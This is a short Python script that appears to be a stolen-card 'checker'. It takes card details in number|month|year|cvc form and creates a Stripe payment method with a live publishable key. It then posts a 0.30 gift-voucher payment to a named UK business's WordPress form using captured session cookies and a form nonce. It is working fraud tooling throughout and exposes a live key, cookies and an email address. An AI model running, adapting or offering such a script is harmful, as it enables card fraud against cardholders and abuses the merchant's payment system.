import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F758ec59c6a%3B+stripe-js-v3%2F758ec59c6a%3B+card-element&key=pk_live_51NwltJAVtXstrQNhoFxJFcNdvOONIMSspdLDZrDkgWCJ1CGGgzljDyJZQ64YPDZFmx7G2QB4OB0mkNMproXHDpsC00mfjRUHNy'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'mphb_session': '06764af57f13d3ec1fc805ac45d41215%7C%7C1740918284%7C%7C1740917924',
	    '__stripe_mid': '4544600f-4262-4605-a211-890d6dd95f25f11ff9',
	    '__stripe_sid': '888d60f1-09cd-4d5c-b290-21683fe4f5d3fb0d36',
	}
	
	headers = {
	    'authority': 'thehideawaypods.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'mphb_session=06764af57f13d3ec1fc805ac45d41215%7C%7C1740918284%7C%7C1740917924; __stripe_mid=4544600f-4262-4605-a211-890d6dd95f25f11ff9; __stripe_sid=888d60f1-09cd-4d5c-b290-21683fe4f5d3fb0d36',
	    'origin': 'https://thehideawaypods.co.uk',
	    'referer': 'https://thehideawaypods.co.uk/gift-vouchers/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740916556167',
	}
	
	data = 'data=__fluent_form_embded_post_id%3D1430%26_fluentform_4_fluentformnonce%3D296f626b86%26_wp_http_referer%3D%252Fgift-vouchers%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser20%2540gmail.com%26input_text%3DRodam%26custom-payment-amount%3D0.30%26payment_input%255B%255D%3DSend%2520me%2520an%2520e-Voucher%2520(Free!)%26hidden_1%3D-03-25%26hidden%3DYCV02143003-%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=4'
	
	r2 = requests.post(
	    'https://thehideawaypods.co.uk/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
